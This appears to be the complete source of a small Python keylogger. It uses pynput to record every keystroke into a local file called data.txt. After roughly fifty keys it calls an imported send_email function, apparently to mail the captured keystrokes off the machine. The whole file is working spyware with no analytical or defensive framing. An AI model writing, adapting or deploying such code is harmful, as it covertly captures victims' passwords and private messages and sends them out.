from pynput import keyboard
import send_email


def get_keys():
    with open('data.txt', 'r') as file:
        text = file.read()
        file.close()
    return text


def add_key(key: str):
    keys = get_keys()
    with open('data.txt', 'w') as file:
        file.write(f'{keys}{key} ')
        file.close()


def on_press(key):
    try:
        key_name = key.char
    except:
        key_name = key.name
    add_key(key_name)
    return False


def main():
    with open('data.txt', 'w') as file:
        file.write(' ')
    while True:
        length = len(get_keys().split(' '))
        if length < 50:
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()
        else:
            send_email.send_email()


if __name__ == '__main__':
    main()
